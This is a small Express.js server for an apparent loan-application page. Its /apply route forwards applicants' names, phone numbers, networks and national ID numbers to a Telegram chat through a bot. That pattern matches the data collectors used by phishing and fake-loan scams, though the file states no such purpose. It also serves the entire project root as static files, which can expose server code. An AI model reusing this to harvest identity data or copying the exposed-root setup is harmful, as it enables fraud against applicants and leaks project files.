const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🔐 ENV VARIABLES
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// ✅ Serve files from ROOT (since index.html is not in /public)
app.use(express.static(__dirname));

// ✅ Home route
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ✅ Handle form submission
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  // Validate (prevents crash)
  if (!name || !phone || !network || !amount || !nationalId) {
    return res.status(400).send("All fields are required");
  }

  const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📱 Phone: ${phone}
📡 Network: ${network}
💰 Amount: ${amount}
🆔 ID: ${nationalId}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });

    res.send("✅ Application submitted successfully!");
  } catch (error) {
    console.error("Telegram Error:", error.response?.data || error.message);
    res.status(500).send("❌ Error sending application.");
  }
});

// ✅ Start server (Railway fix)
const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});
